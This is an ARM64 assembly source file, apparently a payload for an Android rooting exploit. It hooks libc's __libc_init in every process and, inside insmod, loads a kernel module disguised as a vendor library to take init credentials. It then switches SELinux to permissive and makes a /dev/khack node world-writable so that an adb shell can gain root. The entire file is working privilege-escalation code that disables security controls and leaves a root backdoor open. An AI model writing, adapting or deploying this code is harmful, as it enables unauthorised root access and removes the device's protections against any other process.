/* libcinit.S - hook payload for /system/lib64/libc.so's __libc_init.
 *
 * Runs in every process that starts, so it bails out unless the caller is the
 * insmod process we just spawned (uid 0, comm "insmod"). When it is, we are in
 * the vendor_modprobe domain and can call finit_module() ourselves.
 *
 * On success we take root here (open /dev/khack -> commit_creds(init_cred)),
 * put SELinux into permissive (we are kernel SID by then), and exec ksud's
 * late-load so the SU manager takes over. On failure the errno is encoded into
 * the process name and the process parks for a minute so it can be observed.
 */
    .arch armv8-a

    .include "include.inc"

    .equ SYS_nanosleep, 101

    .global libc2_start
    .global libc2_data
    .global libc2_len
    .global libc2_first_inst_copy
    .data

libc2_data:
comm_path:
    .asciz "/proc/self/comm"
want_comm:
    .ascii "insmod"
empty_arg:
    .asciz ""
khack_dev:
    .asciz "/dev/khack"
proof_path:
    .asciz "/data/local/tmp/dfroot_ok"
proof_str:
    .asciz "ok"
enforce_path:
    .asciz "/sys/fs/selinux/enforce"
zero_str:
    .asciz "0"
ksud_path:
    .asciz "/data/user/0/df.root/ksud"
arg_late:
    .asciz "late-load"
arg_pkgflag:
    .asciz "--package-name"
arg_pkg:
    .asciz "me.weishu.kernelsu"
namebuf:
    .asciz "df00"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes */
    .balign 4
    .global libc2_ko_target_off
libc2_ko_target_off:
    .int ko_target - libc2_data

    .align 4

/* frame: [0..32]=argv [40]=code [48..63]=timespec */
libc2_start:
    stp     x0, x1, [sp, #-16]!
    stp     x2, x3, [sp, #-16]!
    stp     x8, x9, [sp, #-16]!
    stp     x29, x30, [sp, #-16]!
    sub     sp, sp, 64

    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, L_out

    // comm == "insmod" ?
    mov     x0, -100
    adr     x1, comm_path
    mov     x2, #0
    mov     x3, #0
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, L_out
    mov     x9, x0
    mov     x0, x9
    mov     x1, sp
    mov     x2, #16
    mov     x8, #SYS_read
    svc     0
    mov     x0, x9
    mov     x8, #SYS_close
    svc     0

    adr     x1, want_comm
    ldr     w2, [x1]
    ldr     w3, [sp]
    cmp     w2, w3
    b.ne    L_out
    ldrh    w2, [x1, #4]
    ldrh    w3, [sp, #4]
    cmp     w2, w3
    b.ne    L_out

    // finit_module(open(ko_target))
    mov     x0, -100
    adr     x1, ko_target
    mov     x2, #0
    mov     x3, #0
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, L_open_fail
    mov     x9, x0
    mov     x0, x9
    adr     x1, empty_arg
    mov     x2, #0
    mov     x8, #SYS_finit_module
    svc     0
    cbz     x0, L_loaded
    neg     x0, x0
    cmp     x0, #17                 // EEXIST: the module is already loaded
    b.eq    L_loaded
    b       L_report
L_open_fail:
    neg     x0, x0
    orr     x0, x0, #0x80

L_report:
    // failure: encode errno in the process name, park for a minute
    and     w9, w0, #0xff
    lsr     w10, w9, #4
    and     w11, w9, #0xf
    adr     x5, namebuf
    mov     w6, #'d'
    strb    w6, [x5]
    mov     w6, #'f'
    strb    w6, [x5, #1]
    add     w10, w10, #'0'
    cmp     w10, #'9'
    b.le    1f
    add     w10, w10, #0x27
1:  strb    w10, [x5, #2]
    add     w11, w11, #'0'
    cmp     w11, #'9'
    b.le    2f
    add     w11, w11, #0x27
2:  strb    w11, [x5, #3]
    strb    wzr, [x5, #4]
    mov     x0, #15                 // PR_SET_NAME
    mov     x1, x5
    mov     x2, #0
    mov     x3, #0
    mov     x4, #0
    mov     x8, #167                // prctl
    svc     0
    b       L_park

L_loaded:
    // The module already gave this process init_cred in its own init (we are
    // the caller of finit_module). Prove it: writing here is only allowed with
    // the kernel SID, and shell can read the file back.
    mov     x0, -100
    adr     x1, proof_path
    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    mov     x3, #0666
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, 4f
    mov     x9, x0
    mov     x0, x9
    adr     x1, proof_str
    mov     x2, #2
    mov     x8, #SYS_write
    svc     0
    mov     x0, x9
    mov     x8, #SYS_close
    svc     0
4:
    // SELinux permissive (kernel SID can write this)
    mov     x0, -100
    adr     x1, enforce_path
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x3, #0
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, 3f
    mov     x9, x0
    mov     x0, x9
    adr     x1, zero_str
    mov     x2, #1
    mov     x8, #SYS_write
    svc     0
3:
    // ueventd re-applies its own mode to a fresh devtmpfs node, so give it a
    // moment before overriding it.
    mov     x0, #3
    str     x0, [sp, #48]
    str     xzr, [sp, #56]
    add     x0, sp, #48
    mov     x1, xzr
    mov     x8, #SYS_nanosleep
    svc     0

    // Hand root to the adb shell instead of starting ksud: open the node up so
    // a uid 2000 process can open() it and pick up init_cred, and with SELinux
    // permissive the kernel SID no longer blocks anything.
    mov     x0, -100
    adr     x1, khack_dev
    mov     x2, #0666
    mov     x3, #0
    mov     x8, #SYS_fchmodat
    svc     0

    mov     x0, #0
L_park:
    str     x0, [sp, #40]
    mov     x1, #600
    str     x1, [sp, #48]
    str     xzr, [sp, #56]
    add     x0, sp, #48
    mov     x1, xzr
    mov     x8, #SYS_nanosleep
    svc     0
    ldr     x0, [sp, #40]
    mov     x8, #SYS_exit
    svc     0

L_out:
    add     sp, sp, 64
    ldp     x29, x30, [sp], #16
    ldp     x8, x9, [sp], #16
    ldp     x2, x3, [sp], #16
    ldp     x0, x1, [sp], #16
libc2_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end2
end2:

libc2_end:
libc2_len:
    .word libc2_end - libc2_data
